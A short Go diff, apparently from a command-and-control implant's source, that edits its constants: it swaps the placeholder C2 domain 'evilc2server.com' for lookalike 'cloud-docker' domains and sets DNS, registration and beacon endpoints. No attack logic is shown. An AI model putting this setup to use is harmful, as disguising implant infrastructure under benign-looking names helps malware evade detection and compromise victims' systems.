@@ -6,9 +6,12 @@ import (
 )
 
 const (
+	C2Domain  = "cloud-docker.net"
+	DNSServer = "8.8.8.8:53"
+	// TODO: would use the same DOMAIN for HTTPS + DNS -> rename to these consts to be idiomatic (see above)
 	C2HTTPSURI            = "https://localhost"
-	C2DNSDOMAIN           = "evilc2server.com"
-	C2REGISTERENDPOINT    = "/implant/register"
+	C2DNSDOMAIN           = "cloud-docker.com"
+	C2REGISTERENDPOINT    = "/implant/new"
 	C2HTTPSBEACONENDPOINT = "/implant/beacon"
 )
 
